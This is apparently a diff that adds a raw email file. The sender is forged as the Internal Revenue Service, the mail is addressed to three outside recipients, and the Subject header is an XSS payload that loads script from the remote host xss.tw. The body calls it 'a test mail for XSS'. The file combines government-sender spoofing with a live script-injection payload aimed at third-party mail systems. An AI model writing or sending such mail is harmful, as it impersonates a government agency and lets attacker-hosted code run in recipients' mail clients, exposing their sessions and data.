@@ -1,0 +1,7 @@
+From: "Internal Revenue Service"<refunds@irs.gov>
+To: priest@yazoopsc.org, mcarroway@watervallery.net, drhunt@watervalley.net
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
